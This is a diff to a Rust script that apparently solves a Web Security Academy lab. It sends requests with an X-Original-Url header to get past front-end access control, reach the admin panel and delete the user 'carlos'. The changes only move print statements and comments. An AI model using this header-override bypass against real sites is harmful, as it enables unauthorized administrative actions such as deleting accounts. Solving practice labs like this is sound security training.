@@ -33,31 +33,34 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a8700e303d417e981ac430d00fc0088.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
+
+    print!("{} ", "1. Fetching admin panel..".white());
+    io::stdout().flush();
 
     // fetch admin panel
     // this step in not necessary in the script, you can do step 2 directly
     // it's only a must when solving the lab using the browser
-    print!("{} ", "1. Fetching admin panel..".white());
-    io::stdout().flush();
     let admin_panel = client
         .get(url)
         .header("X-Original-Url", "/admin")
         .send()
         .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
-    println!("{}", "OK".green());
 
-    // delete carlos
+    println!("{}", "OK".green());
     print!("{} ", "2. Deleting carlos..".white());
     io::stdout().flush();
+
+    // delete carlos
     let delete_carlos = client
         .get(format!("{url}?username=carlos"))
         .header("X-Original-Url", "/admin/delete")
         .send()
         .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
